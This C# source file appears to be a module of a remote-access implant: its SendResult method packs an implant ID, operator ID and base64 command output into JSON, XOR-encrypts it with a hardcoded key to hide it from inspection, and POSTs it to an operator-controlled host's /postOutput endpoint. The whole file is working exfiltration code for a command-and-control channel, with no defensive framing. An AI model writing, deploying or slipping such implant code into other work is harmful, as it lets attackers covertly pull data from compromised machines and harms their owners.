using System;
using System.Net;
using System.Text;

namespace HTTPImplant.Modules
{
    public class HTTP
    {
        public static void SendResult(string host, string port, string implantId, string operatorId, string outputBase64)
        {
            WebClient webClient = new WebClient();
            string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
            byte[] XORKey = Convert.FromBase64String(XORKeyB64);

            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
            byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);

            string data = Convert.ToBase64String(encryptedResultJson);

            webClient.UploadString(new Uri("http://" + host + ":" + port + "/postOutput"), "POST", data);
        }

        public static byte[] XOR(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }
    }
}
